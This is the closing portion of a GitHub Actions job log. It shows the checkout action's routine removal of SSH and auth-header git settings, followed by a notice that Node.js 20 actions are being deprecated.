+2026-04-02T19:08:43.4750616Z [command]/usr/bin/git submodule foreach --recursive sh -c "git config --local --name-only --get-regexp 'core\.sshCommand' && git config --local --unset-all 'core.sshCommand' || :"
+2026-04-02T19:08:43.4970764Z [command]/usr/bin/git config --local --name-only --get-regexp http\.https\:\/\/github\.com\/\.extraheader
+2026-04-02T19:08:43.4992409Z http.https://github.com/.extraheader
+2026-04-02T19:08:43.5003142Z [command]/usr/bin/git config --local --unset-all http.https://github.com/.extraheader
+2026-04-02T19:08:43.5033522Z [command]/usr/bin/git submodule foreach --recursive sh -c "git config --local --name-only --get-regexp 'http\.https\:\/\/github\.com\/\.extraheader' && git config --local --unset-all 'http.https://github.com/.extraheader' || :"
+2026-04-02T19:08:43.5393499Z Cleaning up orphan processes
+2026-04-02T19:08:43.5669924Z ##[warning]Node.js 20 actions are deprecated. The following actions are running on Node.js 20 and may not work as expected: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11, actions/upload-artifact@v4. Actions will be forced to run with Node.js 24 by default starting June 2nd, 2026. Node.js 20 will be removed from the runner on September 16th, 2026. Please check if updated versions of these actions are available that support Node.js 24. To opt into Node.js 24 now, set the FORCE_JAVASCRIPT_ACTIONS_TO_NODE24=true environment variable on the runner or in your workflow file. Once Node.js 24 becomes the default, you can temporarily opt out by setting ACTIONS_ALLOW_USE_UNSECURE_NODE_VERSION=true. For more information see: https://github.blog/changelog/2025-09-19-deprecation-of-node-20-on-github-actions-runners/
